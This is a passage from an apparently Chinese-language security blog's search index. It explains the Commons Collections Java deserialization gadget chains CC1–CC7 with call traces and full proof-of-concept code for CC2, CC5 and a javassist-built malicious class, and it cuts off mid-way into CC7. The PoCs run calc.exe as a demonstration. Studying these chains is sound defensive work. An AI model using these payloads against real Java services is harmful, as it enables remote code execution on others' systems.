commons-collections4.0\u4e4b\u540e\u53ef\u4ee5\u76f4\u63a5\u56de\u8c03PriorityQueue\u4f5c\u4e3a\u524d\u6bb5\uff0c\u4e4b\u524d\u4e0d\u884c","title":"\u53cd\u5e8f\u5217\u5316CC\u7bc7\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E6%80%BB%E7%BB%93/#\u81ea\u5df1\u5199\u7684\u5de5\u5177-javaggc","text":"https://github.com/WAY29/javaGGC","title":"\u81ea\u5df1\u5199\u7684\u5de5\u5177-javaGGC"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E6%80%BB%E7%BB%93/#cc\u94fe\u8c03\u7528\u903b\u8f91","text":"","title":"CC\u94fe\u8c03\u7528\u903b\u8f91"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E6%80%BB%E7%BB%93/#cc1","text":"AnnotationInvocationHandler.readObject() Proxy.entrySet() // readObject\u8c03\u7528\u4e86proxy\u7684\u67d0\u4e9b\u65b9\u6cd5\uff0c\u56de\u8c03invoke Proxy.invoke() === AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() // \u83b7\u53d6Runtime.class InvokerTransformer.transform() // \u83b7\u53d6Runtime.getRuntime InvokerTransformer.transform() // \u83b7\u53d6Runtime\u5b9e\u4f8b InvokerTransformer.transform() // \u8c03\u7528exec\u65b9\u6cd5\u89e6\u53d1rce","title":"CC1"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E6%80%BB%E7%BB%93/#cc2","text":"PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() comparator.compare() === TransformingComparator.compare() InvokerTransformer.transform() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() // \u5b9a\u4e49\u7c7b ... // \u521b\u5efa\u7c7b\u5b9e\u4f8b\uff0c\u89e6\u53d1static\u4ee3\u7801\u5757","title":"CC2"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E6%80%BB%E7%BB%93/#cc3","text":"AnnotationInvocationHandler.readObject() Proxy.entrySet() // readObject\u8c03\u7528\u4e86proxy\u7684\u67d0\u4e9b\u65b9\u6cd5\uff0c\u56de\u8c03invoke Proxy.invoke() === AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() InvokerTransformer.transform() InstantiateTransformer.transform() newInstance() TrAXFilter#TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() // \u5b9a\u4e49\u7c7b ... // \u521b\u5efa\u7c7b\u5b9e\u4f8b\uff0c\u89e6\u53d1static\u4ee3\u7801\u5757","title":"CC3"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E6%80%BB%E7%BB%93/#cc4","text":"PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() comparator.compare() === TransformingComparator.compare() ChainedTransformer.transform() InvokerTransformer.transform() InstantiateTransformer.transform() newInstance() TrAXFilter#TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() // \u5b9a\u4e49\u7c7b ... // \u521b\u5efa\u7c7b\u5b9e\u4f8b\uff0c\u89e6\u53d1static\u4ee3\u7801\u5757","title":"CC4"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E6%80%BB%E7%BB%93/#cc5","text":"BadAttributeValueExpException.readObject() valObj.toString() === TiedMapEntry.toString() TiedMapEntry.getValue() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() // \u83b7\u53d6Runtime.class InvokerTransformer.transform() // \u83b7\u53d6Runtime.getRuntime InvokerTransformer.transform() // \u83b7\u53d6Runtime\u5b9e\u4f8b InvokerTransformer.transform() // \u8c03\u7528exec\u65b9\u6cd5\u89e6\u53d1rce","title":"CC5"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E6%80%BB%E7%BB%93/#cc6","text":"HashMap.readObject() putForCreate(key) === key.hashCode() === TiedMapEntry.hashCode() TiedMapEntry.getValue() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() // \u83b7\u53d6Runtime.class InvokerTransformer.transform() // \u83b7\u53d6Runtime.getRuntime InvokerTransformer.transform() // \u83b7\u53d6Runtime\u5b9e\u4f8b InvokerTransformer.transform() // \u8c03\u7528exec\u65b9\u6cd5\u89e6\u53d1rce","title":"CC6"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E6%80%BB%E7%BB%93/#cc7","text":"Hashtable.readObject() Hashtable.reconstitutionPut() org.apache.commons.collections.map.AbstractMapDecorator.equals() === java.util.AbstractMap.equals() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() // \u83b7\u53d6Runtime.class InvokerTransformer.transform() // \u83b7\u53d6Runtime.getRuntime InvokerTransformer.transform() // \u83b7\u53d6Runtime\u5b9e\u4f8b InvokerTransformer.transform() // \u8c03\u7528exec\u65b9\u6cd5\u89e6\u53d1rce","title":"CC7"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC%E7%AF%87%E8%A1%A5%E5%85%85/","tags":["java","java\u5b89\u5168","\u53cd\u5e8f\u5217\u5316"],"text":"\u53cd\u5e8f\u5217\u5316CC\u7bc7\u8865\u5145 # CC2 # \u5165\u53e3 # \u9996\u5148\uff0cCC2\u7684\u4f7f\u7528\u6761\u4ef6\u662fcommons-collections4.x\u7248\u672c\uff0c\u4e3a\u4ec0\u4e48\u4e0d\u80fd\u75283.x\u7248\u672c\u5462\uff1f\u56e0\u4e3a TransformingComparator \u7c7b\u57283.x\u7248\u672c\u4e2d\u6ca1\u6709\u5b9e\u73b0 Serializable \u63a5\u53e3\uff0c\u65e0\u6cd5\u88ab\u5e8f\u5217\u5316\u3002 \u6240\u4ee5\u6211\u4eec\u5148\u5728pom.xml\u4e2d\u6dfb\u52a0\u4ee5\u4e0b\u4f9d\u8d56: <dependency> <groupId> org.apache.commons </groupId> <artifactId> commons-collections4 </artifactId> <version> 4.0 </version> </dependency> CC2\u7684\u5165\u53e3\u4f7f\u7528\u4e86 PriorityQueue \u548c TransformingComparator \uff0c\u5176readObject\u65b9\u6cd5\u4f1a\u6700\u7ec8\u8c03\u7528\u5230 comparer.comare \uff0c\u800c TransformingComparator \u7684 compare \u65b9\u6cd5\u5219\u4f1a\u8c03\u7528 this.transformer.transform \u65b9\u6cd5\uff0c\u4ece\u800c\u62fc\u63a5\u4e0a\u94fe\u7684\u540e\u534a\u90e8\u5206\u3002 PriorityQueue\u5173\u952e\u4ee3\u7801 # \u8c03\u7528\u94fe\u4e3a PriorityQueue.readObject() -> PriorityQueue.heapify() -> PriorityQueue.siftDown() -> PriorityQueue.siftDownUsingComparator() -> comparator.compare() : public class PriorityQueue < E > extends AbstractQueue < E > implements java . io . Serializable { // ... private void readObject ( java . io . ObjectInputStream s ) throws java . io . IOException , ClassNotFoundException { // Read in size, and any hidden stuff s . defaultReadObject (); // Read in (and discard) array length s . readInt (); SharedSecrets . getJavaOISAccess (). checkArray ( s , Object [] . class , size ); queue = new Object [ size ] ; // Read in all elements. for ( int i = 0 ; i < size ; i ++ ) queue [ i ] = s . readObject (); // Elements are guaranteed to be in \"proper order\", but the // spec has never explained what that might be. heapify (); } private void heapify () { for ( int i = ( size >>> 1 ) - 1 ; i >= 0 ; i -- ) siftDown ( i , ( E ) queue [ i ] ); } private void siftDown ( int k , E x ) { if ( comparator != null ) siftDownUsingComparator ( k , x ); else siftDownComparable ( k , x ); } private void siftDownUsingComparator ( int k , E x ) { int half = size >>> 1 ; while ( k < half ) { int child = ( k << 1 ) + 1 ; Object c = queue [ child ] ; int right = child + 1 ; if ( right < size && comparator . compare (( E ) c , ( E ) queue [ right ] ) > 0 ) c = queue [ child = right ] ; if ( comparator . compare ( x , ( E ) c ) <= 0 ) break ; queue [ k ] = c ; k = child ; } queue [ k ] = x ; } // ... } TransformingComparator\u5173\u952e\u4ee3\u7801 # public class TransformingComparator < I , O > implements Comparator < I > , Serializable { public int compare ( I obj1 , I obj2 ) { O value1 = this . transformer . transform ( obj1 ); O value2 = this . transformer . transform ( obj2 ); return this . decorated . compare ( value1 , value2 ); } } \u521d\u59cb\u7248\u672c\u7684poc # poc # poc\u5982\u4e0b: import org.apache.commons.collections4.Transformer ; import org.apache.commons.collections4.comparators.TransformingComparator ; import org.apache.commons.collections4.functors.ChainedTransformer ; import org.apache.commons.collections4.functors.ConstantTransformer ; import org.apache.commons.collections4.functors.InvokerTransformer ; import org.apache.commons.collections4.keyvalue.TiedMapEntry ; import org.apache.commons.collections4.map.LazyMap ; import javax.management.BadAttributeValueExpException ; import java.io.ByteArrayInputStream ; import java.io.ByteArrayOutputStream ; import java.io.ObjectInputStream ; import java.io.ObjectOutputStream ; import java.lang.reflect.Field ; import java.util.HashMap ; import java.util.Map ; import java.util.PriorityQueue ; public class CC2 { public static void main ( String [] args ) throws Exception { Transformer [] fakeTransformers = new Transformer [] { new ConstantTransformer ( 1 )}; Transformer [] transformers = new Transformer [] { new ConstantTransformer ( Runtime . class ), new InvokerTransformer ( \"getMethod\" , new Class [] { String . class , Class [] . class }, new Object [] { \"getRuntime\" , new Class [ 0 ] }), new InvokerTransformer ( \"invoke\" , new Class [] { Object . class , Object [] . class }, new Object [] { null , new Object [ 0 ] }), new InvokerTransformer ( \"exec\" , new Class [] { String . class }, new Object [] { \"calc.exe\" }), new ConstantTransformer ( 1 ), }; // \u5148\u4f7f\u7528fakeTransformer\u9632\u6b62\u672c\u5730\u547d\u4ee4\u6267\u884c Transformer transformerChain = new ChainedTransformer ( fakeTransformers ); TransformingComparator comparator = new TransformingComparator ( transformerChain ); PriorityQueue queue = new PriorityQueue ( 1 ); queue . add ( 1 ); queue . add ( 2 ); // \u4f7f\u7528\u53cd\u5c04\u66ff\u6362transformerChain\u7684transformers Field f = ChainedTransformer . class . getDeclaredField ( \"iTransformers\" ); f . setAccessible ( true ); f . set ( transformerChain , transformers ); // \u4f7f\u7528\u53cd\u5c04\u66ff\u6362TransformingComparator\u7684comparator f = Class . forName ( \"java.util.PriorityQueue\" ). getDeclaredField ( \"comparator\" ); f . setAccessible ( true ); f . set ( queue , comparator ); ByteArrayOutputStream barr = new ByteArrayOutputStream (); ObjectOutputStream oos = new ObjectOutputStream ( barr ); oos . writeObject ( queue ); oos . close (); System . out . println ( barr ); ObjectInputStream ois = new ObjectInputStream ( new ByteArrayInputStream ( barr . toByteArray ())); Object o = ( Object ) ois . readObject (); } } \u8fd9\u4e2apoc\u6709\u51e0\u4e2a\u9700\u8981\u6ce8\u610f\u7684\u70b9: 1. \u9700\u8981\u5f80queue\u91ccadd\u4e24\u4e2a\u503c\u8fdb\u53bb\uff0c\u8fd9\u662f\u4e3a\u4e86\u5176size\u80fd\u5927\u4e8e1\uff0c\u80fd\u8fdb\u5165heapify\u4e2dfor\u5faa\u73af\u7684\u903b\u8f91 2. \u9700\u8981\u5728add\u503c\u4e4b\u540e\u624d\u901a\u8fc7\u53cd\u5c04\u8bbe\u7f6ecomparator\uff0c\u8fd9\u662f\u56e0\u4e3aadd\u5b58\u5728\u4ee5\u4e0b\u8c03\u7528\u94fe: PriorityQueue.add() -> PriorityQueue.offer() -> PriorityQueue.siftUp() -> siftUpUsingComparator() -> comparator.compare() \uff0c\u8fd9\u4f1a\u5bfc\u81f4\u6211\u4eec\u7684\u94fe\u63d0\u524d\u89e6\u53d1\uff0c\u800c\u4e14\u4f1a\u4ea7\u751f\u62a5\u9519(\u8fd9\u91cc\u53c2\u8003\u4e86 https://paper.seebug.org/1242/#commonscollections-2 \u8fd9\u7bc7\u6587\u7ae0\uff0c\u4f46\u662f\u7ecf\u8fc7\u6d4b\u8bd5\u63d0\u524d\u8bbe\u7f6e\u5e76\u4e0d\u4f1a\u51fa\u9519) \u8c03\u7528\u903b\u8f91 # \u6574\u6761\u94fe\u7684\u8c03\u7528\u903b\u8f91\u4e3a: PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() comparator.compare() === TransformingComparator.compare() ChainedTransformer.transform() ConstantTransformer.transform() // \u83b7\u53d6Runtime.class InvokerTransformer.transform() // \u83b7\u53d6Runtime.getRuntime InvokerTransformer.transform() // \u83b7\u53d6Runtime\u5b9e\u4f8b InvokerTransformer.transform() // \u8c03\u7528exec\u65b9\u6cd5\u89e6\u53d1rce \u53e6\u5916\u4e00\u4e2a\u7248\u672c\u7684poc # \u53e6\u5916\u4e00\u4e2a\u7248\u672c\u7684poc\u7684\u7ec8\u70b9\u4e0d\u518d\u662f\u6211\u4eec\u719f\u6089\u7684 ChainedTransformer \u90a3\u4e00\u5957\u56de\u8c03\u9020\u6210\u7684\u547d\u4ee4\u6267\u884c\uff0c\u800c\u662f\u53ef\u4ee5\u9020\u6210\u4efb\u610fjava\u4ee3\u7801\u6267\u884c\u7684 TemplatesImpl : \u8ddf\u8fdb getTransletInstance : \u518d\u8ddf\u8fdb defineTransletClasses : \u8fd9\u91cc\u901a\u8fc7loader.defineClass\u5c06bytecodes\u8fd8\u539f\u4e3aClass\uff0c\u63a5\u7740\u5728\u5916\u9762\u53c8\u8c03\u7528\u4e86 _class[_transletIndex].newInstance \u65b9\u6cd5\u5b9e\u4f8b\u5316\u8fd8\u539f\u7684Class\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u6076\u610f\u7c7b\u5b57\u8282\u7801\uff0c\u5176\u5177\u6709\u6076\u610f\u7684static\u8bed\u53e5\u5757\uff0c\u5bfc\u81f4\u4efb\u610fjava\u4ee3\u7801\u6267\u884c\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 TemplatesImpl.newTransformer \u65b9\u6cd5\u6765\u6267\u884c\u6076\u610f\u7c7b\u7684static\u8bed\u53e5\u5757\u3002 \u8fd9\u91cc\u6211\u4eec\u5c31\u9700\u8981\u989d\u5916\u4e86\u89e3\u4e00\u4e9b\u77e5\u8bc6\uff0c\u9700\u8981\u4e86\u89e3javassit\u8fd9\u4e2a\u5e93\uff0c\u8fd9\u662f\u4e00\u4e2a\u7528\u6765\u5904\u7406Java \u5b57\u8282\u7801\u7684\u7c7b\u5e93\uff0c\u6211\u4eec\u9700\u8981\u7b80\u5355\u5b66\u4e60\u5b83\u7684\u4f7f\u7528\u3002 javassit # maven\u4f9d\u8d56 # <dependency> <groupId> org.javassist </groupId> <artifactId> javassist </artifactId> <version> 3.25.0-GA </version> </dependency> \u7b80\u5355\u4f7f\u7528 # \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u4ee3\u7801\u6765\u5b9e\u73b0\u751f\u6210java\u5b57\u8282\u7801: import javassist.* ; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl ; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet ; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl ; public class javassit_test { public static void createPseson () throws Exception { ClassPool pool = ClassPool . getDefault (); CtClass cc = pool . makeClass ( \"Cat\" ); String cmd = \"Runtime.getRuntime().exec(\\\"calc.exe\\\");\" ; // \u521b\u5efa static \u4ee3\u7801\u5757\uff0c\u5e76\u63d2\u5165\u4ee3\u7801 cc . makeClassInitializer (). insertBefore ( cmd ); String randomClassName = \"EvilCat\" + System . nanoTime (); cc . setName ( randomClassName ); // \u751f\u6210bytes\u5b57\u8282\u7801\uff0c\u7b49\u4e0b\u8981\u7528\u5230 //byte[] classBytes = cc.toBytecode(); // \u5199\u5165.class \u6587\u4ef6 cc . writeFile ( \"./\" ); } public static void main ( String [] args ) { try { createPseson (); } catch ( Exception e ) { e . printStackTrace (); } } } \u751f\u6210\u7684\u4ee3\u7801\u5927\u6982\u5982\u4e0b: import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet ; public class EvilCat32193904579700 extends AbstractTranslet { static { Runtime . getRuntime (). exec ( \"calc.exe\" ); } public EvilCat32193904579700 () { } } poc # \u4e86\u89e3\u4e86javassit\u77e5\u8bc6\u4e4b\u540e\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u6784\u5efa\u6211\u4eec\u6700\u540e\u7684poc\u4e86: import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet ; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl ; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl ; import javassist.ClassClassPath ; import javassist.ClassPool ; import javassist.CtClass ; import org.apache.commons.collections4.Transformer ; import org.apache.commons.collections4.functors.InvokerTransformer ; import org.apache.commons.collections4.comparators.TransformingComparator ; import java.io.ByteArrayInputStream ; import java.io.ByteArrayOutputStream ; import java.io.ObjectInputStream ; import java.io.ObjectOutputStream ; import java.lang.reflect.Field ; import java.util.Arrays ; import java.util.PriorityQueue ; public class CC2 { public static TemplatesImpl generateEvilTemplates () throws Exception { ClassPool pool = ClassPool . getDefault (); pool . insertClassPath ( new ClassClassPath ( AbstractTranslet . class )); CtClass cc = pool . makeClass ( \"Cat\" ); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\" ; // \u521b\u5efa static \u4ee3\u7801\u5757\uff0c\u5e76\u63d2\u5165\u4ee3\u7801 cc . makeClassInitializer (). insertBefore ( cmd ); String randomClassName = \"EvilCat\" + System . nanoTime (); cc . setName ( randomClassName ); cc . setSuperclass ( pool . get ( AbstractTranslet . class . getName ())); // \u8f6c\u6362\u4e3abytes byte [] classBytes = cc . toBytecode (); byte [][] targetByteCodes = new byte [][] { classBytes }; TemplatesImpl templates = TemplatesImpl . class . newInstance (); setFieldValue ( templates , \"_bytecodes\" , targetByteCodes ); // \u8fdb\u5165 defineTransletClasses() \u65b9\u6cd5\u9700\u8981\u7684\u6761\u4ef6 setFieldValue ( templates , \"_name\" , \"name\" + System . nanoTime ()); setFieldValue ( templates , \"_class\" , null ); setFieldValue ( templates , \"_tfactory\" , new TransformerFactoryImpl ()); return templates ; } public static void main ( String [] args ) throws Exception { Transformer transformer = new InvokerTransformer ( \"newTransformer\" , null , null ); TransformingComparator comparator = new TransformingComparator ( transformer ); PriorityQueue queue = new PriorityQueue ( 2 ); TemplatesImpl templates = generateEvilTemplates (); setFieldValue ( queue , \"queue\" , new Object [] { templates , 1 }); setFieldValue ( queue , \"size\" , 2 ); setFieldValue ( queue , \"comparator\" , comparator ); //\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316 ByteArrayOutputStream barr = new ByteArrayOutputStream (); ObjectOutputStream oos = new ObjectOutputStream ( barr ); oos . writeObject ( queue ); oos . close (); System . out . println ( barr ); ObjectInputStream ois = new ObjectInputStream ( new ByteArrayInputStream ( barr . toByteArray ())); Object o = ( Object ) ois . readObject (); } public static void setFieldValue ( final Object obj , final String fieldName , final Object value ) throws Exception { final Field field = getField ( obj . getClass (), fieldName ); System . out . println ( field ); System . out . println ( value ); field . set ( obj , value ); } public static Field getField ( final Class <?> clazz , final String fieldName ) { Field field = null ; try { field = clazz . getDeclaredField ( fieldName ); field . setAccessible ( true ); } catch ( NoSuchFieldException ex ) { if ( clazz . getSuperclass () != null ) field = getField ( clazz . getSuperclass (), fieldName ); } return field ; } } \u8c03\u7528\u903b\u8f91 # PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() comparator.compare() === TransformingComparator.compare() InvokerTransformer.transform() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() // \u5b9a\u4e49\u7c7b ... // \u521b\u5efa\u7c7b\u5b9e\u4f8b\uff0c\u89e6\u53d1static\u4ee3\u7801\u5757 CC3 # CC1\u548cCC2\u7684\u6df7\u5408\u4f53\uff0cCC1\u7684\u524d\u6bb5\u548cCC2\u7684\u540e\u6bb5\uff0c\u7528\u5230\u4e86\u4e00\u4e2a\u65b0\u7684\u7c7b TrAXFilter \uff0c\u5176\u6784\u9020\u51fd\u6570\u4f1a\u8c03\u7528\u5176\u5c5e\u6027\u7684 newTransformer \u8c03\u7528\u903b\u8f91 # AnnotationInvocationHandler.readObject() Proxy.entrySet() // readObject\u8c03\u7528\u4e86proxy\u7684\u67d0\u4e9b\u65b9\u6cd5\uff0c\u56de\u8c03invoke Proxy.invoke() === AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() InvokerTransformer.transform() InstantiateTransformer.transform() newInstance() TrAXFilter#TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() // \u5b9a\u4e49\u7c7b ... // \u521b\u5efa\u7c7b\u5b9e\u4f8b\uff0c\u89e6\u53d1static\u4ee3\u7801\u5757 CC4 # \u57fa\u672c\u4e0a\u662fCC2\uff0c\u53ea\u662f\u6362\u6210\u4e86\u7c7b TrAXFilter \uff0c\u5176\u7684\u6784\u9020\u51fd\u6570\u4f1a\u8c03\u7528\u5176\u5c5e\u6027\u7684 newTransformer \u8c03\u7528\u903b\u8f91 # PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() comparator.compare() === TransformingComparator.compare() ChainedTransformer.transform() InvokerTransformer.transform() InstantiateTransformer.transform() newInstance() TrAXFilter#TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() // \u5b9a\u4e49\u7c7b ... // \u521b\u5efa\u7c7b\u5b9e\u4f8b\uff0c\u89e6\u53d1static\u4ee3\u7801\u5757 CC5 # \u5165\u53e3 # CC5\u4e0eCC6\u975e\u5e38\u76f8\u4f3c\uff0c\u4e0d\u540c\u7684\u5730\u65b9\u662f\u901a\u8fc7 TiedMapEntry.toString \u65b9\u6cd5\u800c\u975e TiedMapEntry.hashCode \u65b9\u6cd5\u89e6\u53d1 TiedMapEntry.getValue \u4ece\u800c\u89e6\u53d1 LazyMap.get \u3002 public class TiedMapEntry implements Entry , KeyValue , Serializable { //... public String toString () { return this . getKey () + \"=\" + this . getValue (); } } \u540c\u6837\u7684\uff0c\u6211\u4eec\u9700\u8981\u627e\u5230\u4e00\u4e2a\u53cd\u5e8f\u5217\u5316\u7684\u5165\u53e3\uff0c\u5176 readObject \u4f1a\u89e6\u53d1\u5c5e\u6027\u7684 toString \u65b9\u6cd5\uff0c\u8fd9\u91cc\u7528\u5230\u7684\u662f BadAttributeValueExpException \u8fd9\u4e2a\u7c7b\uff0c\u5176\u7c7b\u7ed3\u6784\u5927\u81f4\u5982\u4e0b: public class BadAttributeValueExpException extends Exception { // ... public BadAttributeValueExpException ( Object val ) { this . val = val == null ? null : val . toString (); } public String toString () { return \"BadAttributeValueException: \" + val ; } private void readObject ( ObjectInputStream ois ) throws IOException , ClassNotFoundException { ObjectInputStream . GetField gf = ois . readFields (); Object valObj = gf . get ( \"val\" , null ); if ( valObj == null ) { val = null ; } else if ( valObj instanceof String ) { val = valObj ; } else if ( System . getSecurityManager () == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean ) { val = valObj . toString (); } else { // the serialized object is from a version without JDK-8019292 fix val = System . identityHashCode ( valObj ) + \"@\" + valObj . getClass (). getName (); } } } \u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u53ea\u8981\u6ee1\u8db3\u6761\u4ef6\u5c31\u4f1a\u89e6\u53d1 valObj.toString() \u65b9\u6cd5\uff0c\u800c valObj \u5176\u5b9e\u5c31\u662f this.val \uff0c\u662f\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\u3002 \u6700\u7ec8poc # \u6211\u4eec\u53ea\u9700\u8981\u5bf9CC6\u94fe\u7a0d\u4f5c\u4fee\u6539\u5373\u53ef\uff0c\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\u6211\u4eec\u540c\u6837\u4f7f\u7528\u53cd\u5c04\u6280\u672f\u4fee\u6539 BadAttributeValueExpException.val \uff0c\u5176\u539f\u56e0\u4e5f\u662f\u56e0\u4e3a\u5982\u679c\u6211\u4eec\u901a\u8fc7\u6784\u9020\u51fd\u6570\u76f4\u63a5\u8bbe\u7f6e\u4e3a TiedMapEntry \u7684\u8bdd\u4f1a\u9020\u6210\u672c\u5730\u547d\u4ee4\u6267\u884c: import org.apache.commons.collections.Transformer ; import org.apache.commons.collections.functors.ChainedTransformer ; import org.apache.commons.collections.functors.ConstantTransformer ; import org.apache.commons.collections.functors.InvokerTransformer ; import org.apache.commons.collections.keyvalue.TiedMapEntry ; import org.apache.commons.collections.map.LazyMap ; import javax.management.BadAttributeValueExpException ; import java.io.ByteArrayInputStream ; import java.io.ByteArrayOutputStream ; import java.io.ObjectInputStream ; import java.io.ObjectOutputStream ; import java.lang.reflect.Field ; import java.util.HashMap ; import java.util.Map ; public class CC5 { public static void main ( String [] args ) throws Exception { Transformer [] fakeTransformers = new Transformer [] { new ConstantTransformer ( 1 )}; Transformer [] transformers = new Transformer [] { new ConstantTransformer ( Runtime . class ), new InvokerTransformer ( \"getMethod\" , new Class [] { String . class , Class [] . class }, new Object [] { \"getRuntime\" , new Class [ 0 ] }), new InvokerTransformer ( \"invoke\" , new Class [] { Object . class , Object [] . class }, new Object [] { null , new Object [ 0 ] }), new InvokerTransformer ( \"exec\" , new Class [] { String . class }, new Object [] { \"calc.exe\" }), new ConstantTransformer ( 1 ), }; // \u5148\u4f7f\u7528fakeTransformer\u9632\u6b62\u672c\u5730\u547d\u4ee4\u6267\u884c Transformer transformerChain = new ChainedTransformer ( fakeTransformers ); Map innerMap = new HashMap (); Map outerMap = LazyMap . decorate ( innerMap , transformerChain ); TiedMapEntry tiedMapEntry = new TiedMapEntry ( outerMap , \"keykey\" ); BadAttributeValueExpException obj = new BadAttributeValueExpException ( 1 ); // \u4f7f\u7528\u53cd\u5c04\u66ff\u6362transformerChain\u7684transformers Field f = ChainedTransformer . class . getDeclaredField ( \"iTransformers\" ); f . setAccessible ( true ); f . set ( transformerChain , transformers ); // \u4f7f\u7528\u53cd\u5c04\u66ff\u6362BadAttributeValueExpException\u7684val f = BadAttributeValueExpException . class . getDeclaredField ( \"val\" ); f . setAccessible ( true ); f . set ( obj , tiedMapEntry ); ByteArrayOutputStream barr = new ByteArrayOutputStream (); ObjectOutputStream oos = new ObjectOutputStream ( barr ); oos . writeObject ( obj ); oos . close (); System . out . println ( barr ); ObjectInputStream ois = new ObjectInputStream ( new ByteArrayInputStream ( barr . toByteArray ())); Object o = ( Object ) ois . readObject (); } } \u8c03\u7528\u903b\u8f91 # \u6574\u6761\u94fe\u7684\u8c03\u7528\u903b\u8f91\u4e3a: BadAttributeValueExpException.readObject() valObj.toString() === TiedMapEntry.toString() TiedMapEntry.getValue() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() // \u83b7\u53d6Runtime.class InvokerTransformer.transform() // \u83b7\u53d6Runtime.getRuntime InvokerTransformer.transform() // \u83b7\u53d6Runtime\u5b9e\u4f8b InvokerTransformer.transform() // \u8c03\u7528exec\u65b9\u6cd5\u89e6\u53d1rce CC7 # \u5165\u53e3 # CC7\u7a0d\u5fae\u6709\u70b9\u590d\u6742\uff0c\u5229\u7528\u7684\u662f Hashtable.equals \u65b9\u6cd5\u53bb\u89e6\u53d1 LazyMap.get \u3002 \u8be6\u60c5\u5206\u6790 \u901a\u4fd7\u6613\u61c2\u7684Java Commons Collections 5\u30016\u30017\u5206\u6790 - \u5148\u77e5\u793e\u533a \u6700\u7ec8poc # package top.longlone ; import org.apache.commons.collections.Transformer ; import org.apache.commons.collections.functors.ChainedTransformer ; import org.apache.commons.collections.functors.ConstantTransformer ; import org.apache.commons.collections.functors.InvokerTransformer ; import org.apache.commons.collections.map.LazyMap ; import java.io.ByteArrayInputStream ; import java.io.ByteArrayOutputStream ; import java.io.ObjectInputStream ; import java.io.ObjectOutputStream ; import java.lang.reflect.Field ; import java.util.HashMap ; import java.util.Hashtable ; import java.util.Map ; public class CC7 { public static void main ( String [] args ) throws Exception { 